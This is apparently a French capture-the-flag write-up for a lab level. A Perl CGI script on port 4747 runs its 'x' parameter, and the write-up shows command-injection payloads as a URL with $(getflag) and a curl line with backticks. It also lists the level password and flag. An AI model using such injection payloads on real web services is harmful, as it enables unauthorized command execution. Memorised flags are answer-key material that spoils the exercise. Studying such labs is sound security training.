# level 04

### ![#409EFF](https://via.placeholder.com/15/409EFF/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ Password`
```
qi0maab88jeaj46qoumi7maus
```

### ![#E6A23C](https://via.placeholder.com/15/E6A23C/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ ‎‏‏‎Exploit`

On voit un fichier perl, en faisant un cat on peut voir qu’un serveur est présent sur le port 4747.

Le fichier attend en paramètre x, et l'exécute.

Il suffit de se connecter sur la page, et de lui envoyer en paramètre getflag pour qu’il l'exécute.

[http://192.168.1.22:4747/level04.pl?x=$(getflag)](http://192.168.1.22:4747/level04.pl?x=$(getflag))

Ou directement via curl
```sh
curl 'localhost:4747/level04.pl?x=`getflag`'
```

```cmd
su level05
```

### ![#67C23A](https://via.placeholder.com/15/67C23A/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ Flag`
```
ne2searoevaevoem4ov4ar8ap
```